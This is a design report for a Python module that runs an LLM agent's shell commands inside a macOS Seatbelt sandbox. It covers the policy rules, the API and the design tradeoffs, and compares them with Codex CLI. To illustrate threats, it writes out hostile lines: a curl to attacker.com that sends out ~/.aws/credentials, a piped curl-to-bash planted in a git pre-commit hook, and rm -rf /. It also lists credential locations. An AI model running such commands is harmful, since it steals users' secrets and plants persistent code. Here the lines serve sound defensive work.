# shell_sandbox.py - Design Report

## What This Is

A Python module that executes shell commands inside a macOS kernel-enforced sandbox.
Every command the agent runs is wrapped with `/usr/bin/sandbox-exec` and a dynamically generated Seatbelt policy profile.
The kernel — not the application — enforces all restrictions.
A command that tries to read `~/.ssh/id_rsa`, write to `.git/hooks/pre-commit`, or connect to the internet is blocked before it can succeed.

The sandbox is the security layer between an LLM agent and the host operating system.
Without it, a hallucinated `rm -rf /` or a prompt-injected `curl attacker.com/exfil?data=$(cat ~/.aws/credentials)` would execute with the user's full privileges.

## Why macOS Seatbelt

We studied 36 open-source AI agent projects for their sandboxing approaches.
The findings:

- **3 projects** ship with production-quality sandboxing that works by default (Codex CLI, OpenHands, Claude Code)
- **33 projects** have no sandboxing — the agent runs with the user's full privileges
- The projects with the strongest sandboxes also have the highest SWE-Bench scores, suggesting that security and capability are not in tension

Of the three sandboxed projects:

| Project | Mechanism | Isolation Level |
|---|---|---|
| **Codex CLI** | macOS Seatbelt / Linux Landlock+Bubblewrap | Kernel syscall-level |
| **OpenHands** | Docker container | Container namespace |
| **Claude Code** | Bubblewrap/sandbox-exec + devcontainer firewall | Kernel + container |

We chose **Seatbelt** (Codex CLI's approach) because:

- **Kernel-enforced** — the process cannot bypass it because restrictions are enforced at the syscall level, not in application code. A bug in a Python sandbox can be escaped; a bug in Seatbelt is a macOS security vulnerability that Apple patches.
- **Zero overhead** — no Docker, no VM, no container startup. The sandbox is applied to the process before `exec()` and adds negligible latency.
- **Transitive** — child processes inherit the sandbox. A shell command that spawns subprocesses cannot escape the restrictions.
- **No setup** — `/usr/bin/sandbox-exec` ships with every macOS installation. No dependencies to install.

The trade-off: **macOS only**. Seatbelt is an Apple technology; this module will not work on Linux or Windows.
For Linux, the equivalent would be Landlock+Bubblewrap (as Codex CLI does).
We chose to ship macOS-only and do it well rather than implement a cross-platform abstraction that's weaker on every platform.

## How It Works

### Architecture

```
Agent (Python)
  │
  │  shell_sandbox.run("git status")
  │
  ▼
shell_sandbox.py (host process)
  │
  │  1. Build Seatbelt .sbpl policy string
  │  2. Build minimal environment
  │  3. subprocess.run([/usr/bin/sandbox-exec, -p, <policy>, -D..., --, bash, -c, "git status"])
  │
  ▼
/usr/bin/sandbox-exec (macOS system binary)
  │
  │  Compiles policy into kernel sandbox profile
  │  Applies profile to the child process
  │
  ▼
bash -c "git status" (runs under sandbox)
  │
  │  Every syscall checked against the profile by the kernel
  │  Blocked operations → "Operation not permitted"
  │
  ▼
ShellResult (returned to agent)
```

### Policy assembly

The Seatbelt policy is assembled from four sections, concatenated at runtime:

1. **Base policy** (`_BASE_POLICY`) — deny-default baseline, process fork/exec, sysctl allowlist, PTY support, cfprefs. Adapted from Codex CLI's [`seatbelt_base_policy.sbpl`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_base_policy.sbpl).

2. **Read policy** — generated dynamically. Full disk read, minus:
   - All `~/.dotfiles` via regex `(deny file-read* (regex #"^/Users/<user>/[.][^/]"))` — blocks `.ssh`, `.aws`, `.gnupg`, `.config`, `.docker`, `.kube`, `.netrc`, `.npmrc`, etc.
   - All `~/Library/` via subpath deny — blocks Keychains, Cookies, Safari passwords, Chrome saved passwords, 1Password, Slack tokens, gcloud credentials.
   - Re-allows `~/Library/Caches` (Homebrew, pip, npm), `~/Library/Developer` (Xcode CLT), `~/Library/Logs`.

3. **Write policy** — generated dynamically. Parameterized `(allow file-write* (subpath (param "WRITABLE_ROOT_N")))` rules for CWD, `/tmp`, `$TMPDIR`, and any extra roots. Protected directories (`.git`, `.superagent`) use `(require-all (subpath ...) (require-not (subpath ...)))` to carve out read-only zones inside writable roots.

4. **Platform defaults** (`_PLATFORM_DEFAULTS`) — system frameworks, dylibs, executables, `/usr/bin`, `/opt/homebrew`, terminal devices, Mach services. Adapted from Codex CLI's [`seatbelt_platform_defaults.sbpl`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_platform_defaults.sbpl).

When `allow_network=True`, a fifth section adds outbound/inbound network rules plus TLS-related Mach services. Adapted from Codex CLI's [`seatbelt_network_policy.sbpl`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_network_policy.sbpl).

All paths are canonicalized before being passed as `-D` parameters to avoid macOS `/var` vs `/private/var` mismatches.

### What the agent sees

The agent calls `run()` and gets a `ShellResult` with:
- `stdout`, `stderr`, `exit_code` — standard command output
- `duration_seconds` — wall-clock time
- `sandbox_enforced` — whether the sandbox was active (always True on macOS)
- `sandbox_denied` — whether the sandbox blocked an operation
- `sandbox_denial_detail` — the specific denial message
- `for_llm()` — a formatted string with all diagnostics, including a hint about which permission flag to set

## API Reference

### `run(command, *, cwd, timeout, allow_network, allow_git_write, extra_writable_roots, extra_readonly_exclusions, env) -> ShellResult`

| Parameter | Type | Default | Description |
|---|---|---|---|
| `command` | `str` or `list[str]` | (required) | Shell command string or argv list |
| `cwd` | `Path` or `str` | `os.getcwd()` | Working directory (also the primary writable root) |
| `timeout` | `float` | `30.0` | Max seconds before killing the process |
| `allow_network` | `bool` | `False` | Allow outbound/inbound network access |
| `allow_git_write` | `bool` | `False` | Allow writes to `.git/` inside CWD |
| `extra_writable_roots` | `list[Path]` | `[]` | Additional writable directories |
| `extra_readonly_exclusions` | `list[str]` | `[]` | Additional dirs inside CWD to protect (e.g. `[".env"]`) |
| `env` | `dict[str, str]` | `None` | Extra environment variables |

### `ShellResult`

| Field | Type | Description |
|---|---|---|
| `stdout` | `str` | Standard output |
| `stderr` | `str` | Standard error |
| `exit_code` | `int` | Process exit code (-1 for timeout or setup failure) |
| `duration_seconds` | `float` | Wall-clock execution time |
| `sandbox_enforced` | `bool` | Whether kernel sandbox was active |
| `sandbox_denied` | `bool` | Whether the sandbox blocked an operation |
| `sandbox_denial_detail` | `str` | Specific denial message |
| `effective_command` | `list[str]` | The full argv including sandbox-exec (for debugging) |
| `ok` | `bool` (property) | `exit_code == 0` |
| `for_llm()` | `str` (method) | Formatted output with diagnostics for LLM consumption |

## Design Decisions and Tradeoffs

### 1. Workspace-write as the only mode

**Decision:** One sandbox mode — CWD is writable, everything else is read-only (with exceptions). No "read-only" or "full-access" modes.

**Why:** Codex CLI supports four modes (read-only, workspace-write, danger-full-access, external-sandbox). In practice, workspace-write is the right default for 95% of coding tasks — the agent needs to read the codebase and write to the project. Read-only is too restrictive for any modification. Full-access defeats the purpose. One mode means one policy, one mental model, no configuration surface for security-critical choices.

**Tradeoff:** Tasks that need to write outside CWD (e.g., installing a global package, modifying system config) must use `extra_writable_roots`. This is explicit and auditable.

### 2. .git protection with allow_git_write escape hatch

**Decision:** `.git/` inside CWD is read-only by default. `allow_git_write=True` lifts this restriction.

**Why:** A malicious or hallucinated command like `echo 'curl attacker.com | bash' > .git/hooks/pre-commit` would inject code that runs with the user's full privileges on their next `git commit`. This is the #1 privilege escalation vector identified in Codex CLI's security model. Protecting `.git` by default blocks it.

Most commands don't need to write to `.git` — `git status`, `git diff`, `git log` are all reads. Only `git commit`, `git stash`, `git checkout` (which creates/modifies refs) need write access.

**How Codex CLI handles this:** When a sandboxed command hits a `.git` write denial, Codex detects the failure, asks the user "retry without sandbox?", and on approval re-runs with `SandboxType::None`. The approval is cached for the session.

**Our approach:** The caller (the tool handler or the agent orchestrator) passes `allow_git_write=True` when it knows the command needs git write access. The `ShellResult.for_llm()` output tells the LLM which flag to set if it encounters a denial, enabling self-correction on the next turn.

**Tradeoff:** The agent must know (or learn) that `git commit` needs `allow_git_write=True`. In practice, the denial message is clear enough that LLMs figure this out on the first failure.

### 3. Network blocked by default

**Decision:** All network access is denied unless `allow_network=True`.

**Why:** Most coding commands don't need internet — `grep`, `sed`, `cat`, `python`, `gcc`, `git status`, `git diff`, `git commit` all work offline. Blocking network prevents data exfiltration (`curl attacker.com?data=$(cat ~/.aws/credentials)`) and supply chain attacks (`pip install malicious-package`).

Codex CLI makes the same choice: `workspace-write` mode blocks network by default.

**Tradeoff:** `npm install`, `pip install`, `curl`, `wget`, `git push`, `git pull` all fail without `allow_network=True`. The caller must explicitly opt in. Network-required operations should be categorized separately in the agent's tool design.

### 4. Aggressive read restrictions (beyond Codex CLI)

**Decision:** Block reads of `~/.dotfiles` and `~/Library/`. Codex CLI allows full disk reads in workspace-write mode.

**Why:** Codex CLI's full-read model assumes that reading is safe because the sandbox blocks exfiltration (no network). But our agent may have `allow_network=True` enabled for legitimate reasons (package installs). With network access, reading `~/.ssh/id_rsa` becomes a real exfiltration risk. Defense in depth: block the read even if network is also blocked.

The `~/Library/` deny is particularly important — it contains macOS Keychains (all stored passwords), browser cookies, Chrome saved passwords (Login Data SQLite), 1Password local data, and app-specific tokens (Slack, gcloud, Docker).

We re-allow `~/Library/Caches` (Homebrew, pip, npm cache), `~/Library/Developer` (Xcode CLT), and `~/Library/Logs` (build logs) because package managers need these.

**Tradeoff:** Some legitimate commands may fail. Examples:
- `git clone git@github.com:...` reads `~/.ssh/` for keys → blocked. The agent must use HTTPS or the caller must inject `SSH_AUTH_SOCK` (which we propagate in the environment).
- A command that reads `~/.gitconfig` → blocked by the dotfiles regex. This means custom git aliases and settings won't apply inside the sandbox.

### 5. deny-after-allow for read restrictions (Seatbelt-specific)

**Decision:** Use `(allow file-read*)` followed by `(deny file-read* (subpath ...))` and `(deny file-read* (regex ...))`.

**Why:** We discovered through testing that Seatbelt evaluates rules in order: later `(deny)` rules DO override earlier `(allow)` rules. This was not documented and contradicted our initial assumption (from some outdated references that said Seatbelt was "first match wins"). We verified empirically with four test cases.

**Seatbelt regex gotcha:** In Seatbelt's regex dialect, `\\.` (backslash-dot) does NOT reliably match a literal dot when passed through Python string escaping. Using `[.]` (character class with dot) works correctly. We discovered this through testing — the `\\\\` Python escape chain produces different results than expected in the Seatbelt regex engine.

**Tradeoff:** The deny-after-allow approach means the policy is order-dependent. The re-allow rules for `~/Library/Caches` must come after the deny for `~/Library/`. This is correct but fragile — reordering the policy sections could silently break the restrictions.

### 6. Minimal environment (env_clear equivalent)

**Decision:** Build a fresh environment with only safe variables: PATH, HOME, USER, LANG, TERM, SHELL, PWD, TMPDIR, SSH_AUTH_SOCK. Do not inherit the parent process's environment.

**Why:** The parent process may have sensitive environment variables: API keys (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`), AWS credentials (`AWS_SECRET_ACCESS_KEY`), database URLs, etc. Passing these to the sandboxed command is unnecessary for most operations and creates an exfiltration surface (the command could `echo $OPENAI_API_KEY` and the agent would see it in stdout).

Codex CLI does the same: `cmd.env_clear()` in [`spawn_child_async()`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/spawn.rs).

**Tradeoff:** Commands that need specific environment variables (e.g., `AWS_REGION` for AWS CLI, custom `PYTHONPATH`) will fail. The `env` parameter allows the caller to explicitly inject what's needed.

### 7. Path canonicalization

**Decision:** All paths passed to Seatbelt as `-D` parameters are canonicalized via `Path.resolve()`.

**Why:** macOS has firmlinks — `/var` is actually `/private/var`, `/tmp` is `/private/tmp`, `/etc` is `/private/etc`. If the sandbox policy uses `/var/folders/.../T/` but the process accesses the file via `/private/var/folders/.../T/`, the Seatbelt subpath match fails because the strings are different despite pointing to the same directory.

Codex CLI canonicalizes all paths for the same reason: `wr.root.as_path().canonicalize()`.

**Tradeoff:** `Path.resolve()` follows symlinks, which means the policy uses the final target path. If a symlink changes after policy creation, the sandbox may allow or deny access to the wrong path. In practice, system symlinks don't change during a session.

### 8. Git worktree awareness

**Decision:** When `.git` is a pointer file (as in git worktrees), also protect the referenced gitdir.

**Why:** In git worktrees, `.git` is a text file containing `gitdir: /path/to/actual/gitdir`. The hooks directory lives in the referenced gitdir, not in `.git/hooks`. Protecting only `.git` (the pointer file) without protecting the gitdir would leave the hooks directory writable — the same privilege escalation vector.

Codex CLI implements the same logic: `is_git_pointer_file()` + `resolve_gitdir_from_file()`.

**Tradeoff:** The resolution reads the `.git` file and follows the path, adding a small amount of I/O during policy construction. This happens once per `run()` call and is negligible.

### 9. Rich diagnostic output for LLM consumption

**Decision:** `ShellResult.for_llm()` includes sandbox denial details, specific error messages, and hints about which permission flag to set.

**Why:** LLMs are good at analyzing error messages and adjusting their approach. A message like "SANDBOX DENIED: bash: .git/hooks/pre-commit: Operation not permitted" with "re-run with allow_git_write=True" gives the LLM enough context to self-correct without human intervention.

Codex CLI provides similar diagnostics: `is_likely_sandbox_denied()` checks for 7 keywords in output, and the orchestrator surfaces the denial with retry options.

**Tradeoff:** The `for_llm()` output can be verbose. Callers may want to truncate it for context-window management. The raw `stdout`/`stderr`/`exit_code` fields are available for callers who want compact output.

### 10. Hardcoded /usr/bin/sandbox-exec path

**Decision:** The path to `sandbox-exec` is hardcoded to `/usr/bin/sandbox-exec`, not resolved from `PATH`.

**Why:** If `sandbox-exec` were resolved from PATH, an attacker could inject a malicious replacement earlier in the PATH that appears to apply a sandbox but actually doesn't. By hardcoding the system path, we ensure we're using Apple's authentic binary. If that binary has been tampered with, the attacker already has root access and the sandbox is moot.

Codex CLI makes the same choice: `const MACOS_PATH_TO_SEATBELT_EXECUTABLE: &str = "/usr/bin/sandbox-exec"`.

**Tradeoff:** None. This is strictly more secure with no downside.

## What's Not Implemented (Yet)

- **Linux support** — Landlock + Bubblewrap, following Codex CLI's [`codex-rs/linux-sandbox/`](https://github.com/openai/codex/tree/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/linux-sandbox) implementation
- **Proxy-only network** — allow network only to specific loopback ports (for MCP servers, local services). Codex CLI supports this via [`proxy_loopback_ports_from_env()`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt.rs)
- **Unix domain socket allowlisting** — allow connections to specific Unix sockets while blocking all other network
- **Sandbox denial auto-retry** — Codex CLI's [orchestrator](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/tools/orchestrator.rs) detects sandbox denial and retries with escalated permissions after user approval. Our module returns the denial; the caller decides what to do.
- **Configuration enforcement** — Codex CLI's `ConfigRequirementsToml` prevents users from downgrading their sandbox level. Useful for enterprise deployment.
- **macOS permission extensions** — Seatbelt can control Apple Events (automation), accessibility, calendar access, preferences read/write. Codex CLI supports these via [`MacOsSeatbeltProfileExtensions`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_permissions.rs).

## References

- Codex CLI sandbox source: [`seatbelt.rs`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt.rs), [`seatbelt_base_policy.sbpl`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_base_policy.sbpl), [`seatbelt_network_policy.sbpl`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_network_policy.sbpl), [`seatbelt_platform_defaults.sbpl`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_platform_defaults.sbpl)
- Codex CLI sandbox orchestration: [`sandboxing/mod.rs`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/sandboxing/mod.rs), [`safety.rs`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/safety.rs), [`spawn.rs`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/spawn.rs)
- Codex CLI sandbox policy types: [`SandboxPolicy`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/protocol/src/protocol.rs), [`seatbelt_permissions.rs`](https://github.com/openai/codex/blob/7e569f11625605f501675e455cfc5e0d642503f2/codex-rs/core/src/seatbelt_permissions.rs)
- Research doc: `research/concepts/security/01-sandboxing-and-isolation.md` - comparative analysis of sandboxing across 36 projects
- Research doc: `research/products/codex-cli/sandbox-system-unique-to-codex-cli.md` - Codex CLI sandbox deep dive
- Chrome's Seatbelt policy (Codex's inspiration): [`sandbox/policy/mac/common.sb`](https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/mac/common.sb) in Chromium source
